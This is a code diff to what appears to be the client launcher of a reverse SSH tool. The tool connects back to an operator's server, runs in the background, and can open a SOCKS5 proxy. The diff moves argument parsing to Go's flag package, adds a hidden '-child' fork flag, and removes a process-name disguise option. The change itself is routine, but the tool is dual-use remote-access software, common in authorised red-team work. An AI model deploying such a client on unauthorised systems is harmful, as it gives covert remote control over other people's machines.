@@ -14,23 +14,30 @@ import (
 	"syscall"
 
 	"github.com/NHAS/reverse_ssh/internal/client"
-	"github.com/NHAS/reverse_ssh/internal/terminal"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 )
 
 var (
-	destination string
-	fingerprint string
-	proxy       string
-	ignoreInput string
-	customSNI   string
-	useKerberos bool
-	// golang can only embed strings using the compile time linker
+	destination    string
+	fingerprint    string
+	proxy          string
+	ignoreInput    string
+	customSNI      string
+	useKerberos    bool
 	useKerberosStr string
 	logLevel       string
 	ntlmProxyCreds string
 	socksPortStr   string
-	socksFlag      = flag.Int("socks", 0, "Start SOCKS5 proxy server on specified port")
+	socksPort      = flag.Int("socks", 0, "Start SOCKS5 proxy server on specified port")
+	foreground     = flag.Bool("foreground", false, "Run in foreground")
+	fg             = flag.Bool("fg", false, "Run in foreground (shorthand)")
+	dest           = flag.String("d", "", "Destination address")
+	fprint         = flag.String("fingerprint", "", "Server fingerprint")
+	proxyFlag      = flag.String("proxy", "", "Proxy address")
+	sniFlag        = flag.String("sni", "", "Custom SNI for TLS")
+	kerb           = flag.Bool("kerberos", false, "Use Kerberos authentication")
+	logLevelFlag   = flag.String("log-level", "", "Set logging level")
+	child          = flag.Bool("child", false, "Internal use only")
 )
 
 func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {
@@ -52,110 +59,48 @@ func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) 
 }
 
 func printHelp() {
-	fmt.Println("usage: ", filepath.Base(os.Args[0]), "--[foreground|fingerprint|proxy|process_name] -d|--destination <server_address>")
-	fmt.Println("\t\t-d or --destination\tServer connect back address (can be baked in)")
-	fmt.Println("\t\t--foreground\tCauses the client to run without forking to background")
-	fmt.Println("\t\t--fingerprint\tServer public key SHA256 hex fingerprint for auth")
-	fmt.Println("\t\t--proxy\tLocation of HTTP connect proxy to use")
-	fmt.Println("\t\t--ntlm-proxy-creds\tNTLM proxy credentials in format DOMAIN\\USER:PASS")
-	fmt.Println("\t\t--process_name\tProcess name shown in tasklist/process list")
-	fmt.Println("\t\t--sni\tWhen using TLS set the clients requested SNI to this value")
-	fmt.Println("\t\t--log-level\tChange logging output levels, [INFO,WARNING,ERROR,FATAL,DISABLED]")
-	fmt.Println("\t\t--socks\tStart SOCKS5 proxy server on specified port")
-	if runtime.GOOS == "windows" {
-		fmt.Println("\t\t--use-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
-	}
+	fmt.Println("Usage: ", filepath.Base(os.Args[0]), "[OPTIONS] <server_address>")
+	fmt.Println("\nOptions:")
+	fmt.Println("  -d, --destination\tDestination server address")
+	fmt.Println("  -fingerprint\t\tServer fingerprint")
+	fmt.Println("  -proxy\t\tProxy address")
+	fmt.Println("  -sni\t\t\tCustom SNI for TLS")
+	fmt.Println("  -kerberos\t\tUse Kerberos authentication")
+	fmt.Println("  -log-level\t\tSet logging level")
+	fmt.Println("  -socks\t\tStart SOCKS5 proxy server on specified port")
+	fmt.Println("  -fg, -foreground\tRun in foreground")
+	fmt.Println("  -child\t\tInternal use only")
 }
 
 func main() {
-	useKerberos = useKerberosStr == "true"
+	flag.Parse()
 
-	if len(os.Args) == 0 || ignoreInput == "true" {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0)
-		return
+	// Get values from flags
+	if *dest != "" {
+		destination = *dest
+	}
+	if *fprint != "" {
+		fingerprint = *fprint
+	}
+	if *proxyFlag != "" {
+		proxy = *proxyFlag
+	}
+	if *sniFlag != "" {
+		customSNI = *sniFlag
+	}
+	if *kerb {
+		useKerberos = true
+	}
+	if *logLevelFlag != "" {
+		logLevel = *logLevelFlag
 	}
 
-	os.Args[0] = strconv.Quote(os.Args[0])
-	var argv = strings.Join(os.Args, " ")
-
-	realArgv, child := os.LookupEnv("F")
-	if child {
-		argv = realArgv
-	}
-
-	os.Unsetenv("F")
-
-	line := terminal.ParseLine(argv, 0)
-
-	if line.IsSet("h") || line.IsSet("help") {
-		printHelp()
-		return
-	}
-
-	fg := line.IsSet("foreground")
-
-	proxyaddress, _ := line.GetArgString("proxy")
-	if len(proxyaddress) > 0 {
-		proxy = proxyaddress
-	}
-
-	userSpecifiedFingerprint, err := line.GetArgString("fingerprint")
-	if err == nil {
-		fingerprint = userSpecifiedFingerprint
-	}
-
-	userSpecifiedSNI, err := line.GetArgString("sni")
-	if err == nil {
-		customSNI = userSpecifiedSNI
-	}
-
-	userSpecifiedNTLMCreds, err := line.GetArgString("ntlm-proxy-creds")
-	if err == nil {
-		ntlmProxyCreds = userSpecifiedNTLMCreds
-	}
-
-	processArgv, _ := line.GetArgsString("process_name")
-
-	if line.IsSet("winauth") {
+	// Handle Windows Kerberos
+	if runtime.GOOS == "windows" && useKerberosStr == "true" {
 		useKerberos = true
 	}
 
-	if !(line.IsSet("d") || line.IsSet("destination")) && len(destination) == 0 && len(line.Arguments) < 1 {
-		fmt.Println("No destination specified")
-		printHelp()
-		return
-	}
-
-	tempDestination, err := line.GetArgString("d")
-	if err != nil {
-		tempDestination, _ = line.GetArgString("destination")
-	}
-
-	if len(tempDestination) > 0 {
-		destination = tempDestination
-	}
-
-	if len(destination) == 0 && len(line.Arguments) > 1 {
-		// Basically take a guess at the arguments we have and take the last one
-		destination = line.Arguments[len(line.Arguments)-1].Value()
-	}
-
-	var actualLogLevel logger.Urgency = logger.INFO
-	userSpecifiedLogLevel, err := line.GetArgString("log-level")
-	if err == nil {
-		actualLogLevel, err = logger.StrToUrgency(userSpecifiedLogLevel)
-		if err != nil {
-			log.Fatalf("invalid log level: %s, err: %s", userSpecifiedLogLevel, err)
-		}
-	} else if logLevel != "" {
-		actualLogLevel, err = logger.StrToUrgency(logLevel)
-		if err != nil {
-			log.Fatalf("default log-level was invalid: %s, err %s", logLevel, err)
-		}
-	}
-	log.Println("setting ll: ", actualLogLevel)
-	logger.SetLogLevel(actualLogLevel)
-
+	// Handle log level
 	if len(logLevel) > 0 {
 		u, err := logger.StrToUrgency(logLevel)
 		if err != nil {
@@ -165,8 +110,14 @@ func main() {
 		}
 	}
 
+	// Handle NTLM proxy credentials
 	if len(ntlmProxyCreds) > 0 {
 		client.SetNTLMProxyCreds(ntlmProxyCreds)
+	}
+
+	// Get destination from remaining args if not set by flag
+	if destination == "" && flag.NArg() > 0 {
+		destination = flag.Arg(0)
 	}
 
 	if len(destination) == 0 {
@@ -175,15 +126,15 @@ func main() {
 		return
 	}
 
-	// After flag.Parse()
-	finalSocksPort := *socksFlag
+	// Handle socks port
+	finalSocksPort := *socksPort
 	
-	// Check embedded value first
+	// Check embedded value if not set by flag
 	if finalSocksPort == 0 && socksPortStr != "" {
 		finalSocksPort, _ = strconv.Atoi(socksPortStr)
 	}
 	
-	// Then check environment variable
+	// Finally check environment variable
 	if finalSocksPort == 0 {
 		if portStr, ok := os.LookupEnv("SOCKS_PORT"); ok {
 			finalSocksPort, _ = strconv.Atoi(portStr)
@@ -194,22 +145,27 @@ func main() {
 		log.Printf("SOCKS5 proxy will be started on port %d", finalSocksPort)
 	}
 
-	if fg || child {
+	// Run/fork logic
+	if *foreground || *fg || *child {
 		Run(destination, fingerprint, proxy, customSNI, useKerberos, finalSocksPort)
 		return
 	}
 
 	if strings.HasPrefix(destination, "stdio://") {
-		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
-		Run(destination, fingerprint, proxy, customSNI, useKerberos, finalSocksPort)
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0) // No socks in stdio mode
 		return
 	}
 
-	err = Fork(destination, fingerprint, proxy, customSNI, useKerberos, processArgv...)
-	if err != nil {
-		Run(destination, fingerprint, proxy, customSNI, useKerberos, finalSocksPort)
-	}
+	// Create new args array with -child flag
+	newArgs := make([]string, 0, len(os.Args)+1)
+	newArgs = append(newArgs, os.Args[0])
+	newArgs = append(newArgs, "-child") // Add the child flag
+	newArgs = append(newArgs, os.Args[1:]...)
 
-	Run(destination, fingerprint, proxy, customSNI, useKerberos, finalSocksPort)
+	// Fork with modified command line arguments including -child
+	err := Fork(destination, fingerprint, proxy, customSNI, useKerberos, newArgs...)
+	if err != nil {
+		Run(destination, fingerprint, proxy, customSNI, useKerberos, 0) // No socks in fallback mode
+	}
 }
